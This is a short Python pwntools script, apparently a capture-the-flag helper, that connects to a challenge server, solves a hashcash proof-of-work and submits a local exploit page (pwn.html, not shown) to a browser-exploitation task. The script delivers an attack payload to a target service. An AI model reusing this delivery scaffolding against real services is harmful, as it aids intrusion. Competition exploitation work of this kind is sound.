#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright: Oran Avraham <contact@oranav.me>
from pwn import remote, log
from subprocess import check_output

data = open('pwn.html', 'rb').read()

s = remote('mojo.pwni.ng', 1337)
s.recvuntil(b'Enter one result of `')
cmd = s.recvuntil(b'`', True)
args = cmd.split(b' ')[1:]
p = log.progress('Computing token')
token = check_output([b'hashcash', *args])
s.send(token)
p.success('Sent token')
s.recvuntil(b'Enter size: ')
s.send(str(len(data)).encode() + b'\n')
s.recvuntil(b'Give me your webpage:')
s.send(data)
log.success('Webpage sent, here it comes:')
s.recvuntil('DevTools')
s.recvline()
s.stream()
